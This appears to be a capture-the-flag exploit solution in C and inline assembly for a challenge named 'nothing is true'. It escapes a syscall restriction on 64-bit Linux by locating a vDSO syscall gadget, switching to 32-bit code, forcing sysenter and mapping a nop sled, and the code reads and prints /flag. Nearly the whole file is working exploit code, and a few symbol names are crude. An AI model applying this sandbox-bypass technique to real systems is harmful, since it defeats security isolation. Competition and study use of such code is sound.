// Okay, this is the sysenter solution to "nothing is true" ( @n1w  ):

// find vDSO using aux vector, and syscall; ret;gadget there
// open flag
// re-open your own binary
// mmap it using sysenter over the address the kernel will return to (this is vDSO address + const truncated to 32 bits (yeah, sysenter is not actually supposed to work on 64 bit Linux, but you can force it to work)). the binary should have a nop sled and appropriate epilogue so return after sysenter will actually return, and not crash
// you can now read/write the flag opened earlier


#include <sys/syscall.h>
#include <elf.h>
#include <sys/mman.h>

char **environ __attribute__((weak));
const unsigned long *_auxv __attribute__((weak));

unsigned long syscall;

static long syscall1(long no, long arg0) {
    long ret;
    asm volatile(
        "call *syscall"
        : "=a" (ret)
        : "a"(no), "D"(arg0)
        : "cc", "rcx", "r11", "memory"
    );
    return ret;
}

static long syscall3(long no, long arg0, long arg1, long arg2) {
    long ret;
    asm volatile(
        "call *syscall"
        : "=a" (ret)
        : "a"(no), "D"(arg0), "S"(arg1), "d"(arg2)
        : "cc", "rcx", "r11", "memory"
    );
    return ret;
}


static long syscall6(long no, long arg0, long arg1, long arg2, long arg3, long arg4, long arg5) {
    long ret;
    register long arg3_ asm("r10") = arg3;
    register long arg4_ asm("r8") = arg4;
    register long arg5_ asm("r9") = arg5;
    asm volatile(
        "call *syscall"
        : "=a" (ret)
        : "a"(no), "D"(arg0), "S"(arg1), "d"(arg2), "r"(arg3_), "r"(arg4_), "r"(arg5_)
        : "cc", "r11", "memory"
    );
    return ret;
}

static __attribute__((unused))
unsigned long getauxval(unsigned long type)
{
	const unsigned long *auxv = _auxv;
	unsigned long ret;

	if (!auxv)
		return 0;

	while (1) {
		if (!auxv[0] && !auxv[1]) {
			ret = 0;
			break;
		}

		if (auxv[0] == type) {
			ret = auxv[1];
			break;
		}

		auxv += 2;
	}

	return ret;
}

__attribute__((weak))
void _start_c(long *sp)
{
	long argc;
	char **argv;
	char **envp;
	const unsigned long *auxv;
	/* silence potential warning: conflicting types for 'main' */
	int _nolibc_main(int, char **, char **) __asm__ ("main");

	/*
	 * sp  :    argc          <-- argument count, required by main()
	 * argv:    argv[0]       <-- argument vector, required by main()
	 *          argv[1]
	 *          ...
	 *          argv[argc-1]
	 *          null
	 * environ: environ[0]    <-- environment variables, required by main() and getenv()
	 *          environ[1]
	 *          ...
	 *          null
	 * _auxv:   _auxv[0]      <-- auxiliary vector, required by getauxval()
	 *          _auxv[1]
	 *          ...
	 *          null
	 */

	/* assign argc and argv */
	argc = *sp;
	argv = (void *)(sp + 1);
	/* find environ */
	environ = envp = argv + argc + 1;
	/* find _auxv */
	for (auxv = (void *)envp; *auxv++;)
		;
	_auxv = auxv;
	/* go to application */
	_nolibc_main(argc, argv, envp);
}

void __attribute__((weak, noreturn, optimize("Os", "omit-frame-pointer"))) _start(void)
{
	__asm__ volatile (
		"xor  %ebp, %ebp\n"       /* zero the stack frame                            */
		"mov  %rsp, %rdi\n"       /* save stack pointer to %rdi, as arg1 of _start_c */
		"and  $-16, %rsp\n"       /* %rsp must be 16-byte aligned before call        */
		"call _start_c\n"         /* transfer to c runtime                           */
		"hlt\n"                   /* ensure it does not return                       */
	);
	__builtin_unreachable();
}

unsigned char *find_syscall(unsigned char *p) {
    while (1) {
        if (p[0] == 0x0f && p[1] == 0x05 && p[2] == 0xc3) {
            return p;
        }
        p++;
    }
}

const char * strcpy(char *restrict dst, const char *restrict src) {
    char *temp = dst;
    while((*dst++ = *src++));
    return temp;
}

__asm__(
    ".code32\n"
    "__sysenter32:\n"
    "pushl   %ecx\n"
    "pushl   %edx\n"
    "pushl   %ebp\n"
    "movl    %esp,%ebp\n"
    "sysenter\n"
    "hlt\n"

    "kek32:\n"
    //"push $0x2b;\n"
    //"pop %%ds;\n"

    // mmap lololol

/*
struct mmap_arg_struct32 {
	unsigned int addr;
	unsigned int len;
	unsigned int prot;
	unsigned int flags;
	unsigned int fd;
	unsigned int offset;
};
*/
    "pushl $0\n" // offset
    "pushl $3\n" // fd
    "pushl $0x11\n" // flags
    "pushl $5\n" // prot
    "pushl $0x3000\n" // len
    "pushl %ebp\n" // addr
    "movl $90, %eax;\n"
    "movl %esp, %ebx\n"
    "call __sysenter32\n"

    // read
    "movl $3, %eax;\n"
    "movl $4, %ebx;\n"
    "movl $0x31337, %ecx;\n"
    "movl $64, %edx;\n"
    "call __sysenter32\n"

    // write
    "movl $4, %eax;\n"
    "movl $1, %ebx;\n"
    "movl $0x31337, %ecx;\n"
    "movl $64, %edx;\n"
    "call __sysenter32\n"

    // exit
    "movl $1, %eax;\n"
    "movl $137, %ebx;\n"
    "call __sysenter32\n"

    ".code64\n"
);

int main(int argc, char **argv, char **envp) {
    static char buf[128];

    unsigned char *vdso = (unsigned char *) getauxval(AT_SYSINFO_EHDR);
    const char *argv0 = (const char *) getauxval(AT_EXECFN);

    syscall = (unsigned long) find_syscall(vdso);

    const unsigned long target_addr = 0x31337;

    char *lol = (char *) syscall6(__NR_mmap, target_addr & ~0xfff, 0x10000, PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    strcpy((char *) target_addr, argv0);
    strcpy((char *) target_addr, argv0); // wtf
    syscall3(__NR_open, (unsigned long) target_addr, 0, 0);
    strcpy((char *) target_addr, "/flag");
    strcpy((char *) target_addr, "/flag"); // wtf
    syscall3(__NR_open, (unsigned long) target_addr, 0, 0);

    long stack = (target_addr & ~0xfff) + 0x8000;
    __asm__ volatile("movq %0, %%rsp;\n" :: "r"(stack)); // do a stack pivot <4GB

    //__asm__ volatile("call kek64\n");

    __asm__ volatile(
        "subq $8, %%rsp;"
        "movl $0x23, 4(%%rsp);"
        "lea kek32, %%rax;"
        "movq %0, %%rbp;"
        "movl %%eax, (%%rsp);"
        "lret"
        :: "r"((unsigned long)vdso & ~0xFFF)
    );

    // Okay, read and write are only available in i386 arch......
    //syscall3(__NR_read, fd, buf, 128);
    //syscall3(__NR_write, 1, buf, 128);
    syscall1(__NR_exit, 137);
}

__asm__(
    ".code32\n"
    ".global _penis\n"
    "_penis:\n"
    ".fill 0x1000, 1, 0x90\n"

    //"int3\n"
    "popl    %ebp\n"
    "popl    %edx\n"
    "popl    %ecx\n"
    "ret\n"

    ".code64\n"
);